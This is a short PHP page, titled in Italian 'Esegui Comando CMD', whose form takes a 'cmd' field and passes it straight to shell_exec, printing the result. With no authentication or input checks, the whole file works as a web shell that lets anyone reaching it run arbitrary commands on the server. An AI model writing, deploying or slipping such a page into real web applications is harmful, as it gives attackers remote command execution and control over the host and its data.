<?php
require_once "config.php";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["cmd"]) && !empty($_POST["cmd"])) {
        $cmd = $_POST["cmd"];
        $output = shell_exec($cmd);

        echo "<h2>Command result</h2>";
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    } else {
        echo "Enter cmd command";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Esegui Comando CMD</title>
</head>
<body>
    <h2>Enter cmd command</h2>
    <form method="post" action="<?php $_SERVER["PHP_SELF"] ?>">
        <label for="cmd">Command:</label><br>
        <input type="text" id="cmd" name="cmd" size="50"><br><br>
        <input type="submit" value="Esegui">
    </form>
</body>
</html>
